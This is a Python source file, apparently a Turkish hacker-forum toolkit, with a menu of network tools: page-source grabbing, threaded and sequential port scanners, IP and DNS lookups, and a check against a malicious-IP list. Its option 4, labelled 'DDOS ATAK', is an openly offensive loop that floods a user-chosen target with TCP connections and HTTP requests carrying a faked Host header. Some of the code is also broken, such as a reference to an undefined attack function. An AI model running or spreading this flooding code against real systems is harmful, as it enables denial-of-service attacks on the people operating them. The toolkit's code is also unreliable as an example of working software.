# coding=utf-8
# ©xyxalpha - tht

import os
from bs4 import BeautifulSoup
import pyfiglet
import socket
import subprocess
import sys
from datetime import datetime
from socket import *
import platform
import re
import requests
from io import BytesIO
from datetime import date
from datetime import time
import random
import math
import datetime
import time
import ssl
import smtplib
from colorama import Fore, Back, Style
import requests as req


logo = """                                                                                                                                                                                                      
    '########:'##::::'##:'########::'##:::'##:'##::::'##::::'###:::::'######:: '##:::'##:
    ::: ##..:: ##:::: ##: ##.... ##: ##::'##:: ##:::: ##:::'## ##:::'##... ##: ##::'##::.
    ::: ##:::: ##:::: ##: ##:::: ##: ##:'##::: ##:::: ##::'##:. ##:: ##:::..:: ##:'##::::
    ::: ##:::: ##:::: ##: ########:: #####:::: #########:'##:::. ##: ##::::::: #####:::::
    ::: ##:::: ##:::: ##: ##.. ##::: ##. ##::: ##.... ##: #########: ##::::::: ##. ##:::/
    ::: ##:::: #########: ##::. ##:: ##:. ##:: ##:::: ##: ##.... ##: ##::: ## ##:. ##::/
        ##_____ _____    _##  __##__ ##   ##   ##     ##  ##     ##  ######## ##   ## /
	|_   _| ____|  / \  |  \/  | ##        ##                                    /
	  | | |  _|   / _ \ | |\/| |------------------------------------------------/
	  | | | |___ / ___ \| |  | |
	  |_| |_____/_/   \_\_|  |_|
		   M.Kemal ATATÜRK     v1.1.0                                                                                                                           
""" 

 
print(Fore.GREEN + Style.BRIGHT + logo + Style.RESET_ALL + Style.BRIGHT +"\n") 
#print(logo)
while True:
    b="""                            
    #############################################################################################                                                                               
    # |----------------------------------------|     ##            ----KULLANIM----             #
    # | YAPİMCİ :  xyxALpHA                    |     ##                                         #
    # |----------------------------------------|     ## 1-)kaynak kod çek      2-)ağ port tara  #
    #                                                ##                                         #
    # |----------------------------------------|     ## 3-)sırayla port tara   4-)DDOS ATAK     #
    # | WEBSİTE : https://www.turkhackteam.org |     ##                                         # 
    # |----------------------------------------|     ## 5-) ip bulucu          6-)Fuzzing       #                                 
    #                                                ## 7-) zararlı ip         8-)whois sorgu   #
    # |----------------------------------------|     ##      tespiti                            #
    # | TWİTTER :  xyxALpHA                    |     ## 9-)dns sorgu          10-)ip sorgu      #
    # |----------------------------------------|     ## ___________________________detaylı______#
    #                                                ## son güncelleme: 12-05-2021    01:13     #
    #############################################################################################
    """
    #print(logo)
    print(Fore.BLUE + Style.BRIGHT + b + Style.RESET_ALL + Style.BRIGHT +"\n")

    soru = input(">>>[+]İSLEM NUMARASI GİRİNİZ:")


    if soru == "1":
        import requests as req
 

        while True:

            url = input(">>>[+]URL GİRİNİZ : ")
            print(Fore.RED + ">>{}".format(url))
            print("\n")
            aralik = int(input(Fore.GREEN + ">>>[+]CEKMEK İSTEDİGİNİZ SATIR SAYISI :"))
            print(Fore.RED + "{}".format(aralik))
            r = req.get(url)
            yaz = r.text

            sor = input(Fore.GREEN + ">>>[+]BİLGİLERİ NE YAPMAK İSTERSİNİZ? [k]aydet / [s]il / [o]ku :")


            if sor == "k":
                dosya_adi = input(Fore.GREEN + ">>>[+]DOSYA İSMİ VE UZANTISI GİRİNİZ :")
                yenidosya = os.open(dosya_adi,os.O_RDWR|os.O_CREAT)
                os.write(yenidosya,yaz.encode())
                os.close(yenidosya)
                print(Fore.BLUE + "BİLGİLER {} DOSYASINA BASARIYLA KAYDEDİLDİ [SUCCESFULLY]".format(dosya_adi))
                okumak = input(Fore.GREEN + "DOSYAYI OKUMAK İSTERMİSİNİZ [e]/[h] :")

                if okumak == "e":

                    yenidosya = os.open(dosya_adi,os.O_RDONLY)
                    uzunluk = os.stat(yenidosya).st_size
                    icerik = os.read(yenidosya,uzunluk)
                    print(icerik.decode())

                else:
                    print(Fore.GREEN + "İSLEM BASARILI..")

            elif sor == "o":
                try:
                    print(yaz)[0:aralik]
                except:
                    pass
                finally:
                    print(Fore.RED + "{} WEB SİTESİNE AİT KAYNAK KODLARINI GORUYORSUNUZ".format(url))

            else:

                print(Fore.RED + "İŞLEM İPTAL EDİLDİ..")

            islem = input(Fore.GREEN + "BASKA İSLEM YAPMAK İSTER MİSİNİZ? [e]/[h] : ")

            if islem == "e":

                continue
            elif islem == "h":
                print(Fore.BLUE + "CIKIS BASARILI")
                break
    
                #dongu=input("BASKA İSLEM YAPMAK İSTER MİSİNİZ? [e]/[h] : ")



    elif soru == "2":
    
        import threading
        from queue import Queue    #AG PORT TARAMA
        import time
        import socket


        print_lock = threading.Lock()



        target = input(Fore.GREEN + ">>>[+]URL GİRİNİZ : https://")
        print(Fore.RED + "taranıyor...bekleyiniz...")
        #ip = socket.gethostbyname(target)




        def portscan(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                con = s.connect((target,port))
                with print_lock:
                    print('ACIK PORT :',port)
                con.close()
            except:
                pass


        #çalışan işlemleri çeker ve işleme alır
        def threader():
            while True:
                # işlem sırasından bir işlem alır
                worker = q.get()

                # sıradaki işlem ile örnek işlem çalıştır
                portscan(worker)

                # işlem tamamlandı
                q.task_done()



        

        #sırayı ve işlemleri oluştur
        q = Queue()

        # izin verilen
        for x in range(30):
             t = threading.Thread(target=threader)

             #arka plan sınıflandırma
             t.daemon = True

             #----------------------------
             t.start()


        start = time.time()

        # 100 işlem
        for worker in range(1,100):
            q.put(worker)

        # işlemler bitene kadar bekleme
        q.join()
        

    elif soru == "3":

        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SIRAYLA PORTLARI TARA--KULLANICIYA BİLDİR
    

        target = input(Fore.GREEN + ">>>[+]HEDEF IP ADRESİ: ")
        def scanner(port):
            try:
                sock.connect((target, port))
                return True
            except:
                return False

        for portNumber in range(1,100):
            print(Fore.RED + "PORT TARANIYOR", portNumber)
            if scanner(portNumber):
                print('[*] Port', portNumber, '/tcp','is open')
        


    elif soru == "4":


        import socket
        import threading

        target = input(Fore.RED + "HEDEF IP:")
        fake_ip = input(Fore.GREEN + "SAHTE IP:")   #ddos atak
        port = int(input(Fore.BLUE + "PORT:"))
    


        attack_num = 0
   
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
            attack_num += 1
            print(Fore.GREEN + "İSLEM BASARİLİ - ATAK NUMARASI {} : ",format(attack_num))
            s.close()


        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()

    elif soru == "5":
       import socket
       try:
           aranacak_ıp = input(Fore.GREEN + "HEDEF URL GİRİNİZ: http://")
           ip = socket.gethostbyname(aranacak_ıp)
           print(ip)

       except:
           print(Fore.GREEN + "SUNUCU IP ADRESİNİ ENGELLEMİŞ OLABİLİR / BU İŞLEMİ GOOGLE VE DİGER BÜYÜK ŞİRKETLER\nİÇİN YAPIYORSANIZ BU HATA NORMAL")




    elif soru == "6":


        import fuzzing

     

    elif soru == "7":


        
        dosya = open("usom.txt","r")
        icerik = dosya.read()
        dosya.close()

        ip =input(">>>[+]URL GİRİNİZ: ")
        bugun = datetime.datetime.now()

        if str(ip) in icerik:

            yaz = "{} adresi zararlıdır !!\nTarih:{}".format(ip,bugun)
            print(yaz)
            kayit = input("Bu bilgiyi kaydetmek ister misiniz? [e]/[h]:")

            if kayit == "e":

                dosya = open("log.txt","a")
                dosya.write(yaz)
                dosya.close()
                print("Bilgiler 'log.txt' dosyasına kaydedildi [*] ")
            else:

                print("Bilgileri kayıt işlemi iptal edildi [*]")


        else:
    
            yaz = "{} adresi güvenli[*]\nTarih:{}".format(ip,bugun)
            print(yaz)
            kayit = input("Bu bilgiyi kaydetmek ister misiniz? [e]/[h]:")

            if kayit == "e":

                dosya = open("log.txt","a")
                dosya.write(yaz)
                dosya.close()
                print("Bilgiler 'log.txt' dosyasına kaydedildi [*] ")
            else:

                print("Bilgileri kayıt işlemi iptal edildi [*]")

    elif soru == "8":

        import whois_sorgu

    elif soru == "9":

        import dns_sorgusu

    elif soru == "10":

        import ip_sorgusu

	





    else:

        print(Fore.RED + "HATA : GECERLİ BİR SECİM YAPMADINIZ!!")

    dongu=input(Fore.BLUE + "BAŞKA BİR İŞLEM YAPMAK İSTİYOR MUSUNUZ? [e]/[h] : ")

    if dongu == "e":
        continue
    elif dongu == "h":
        break









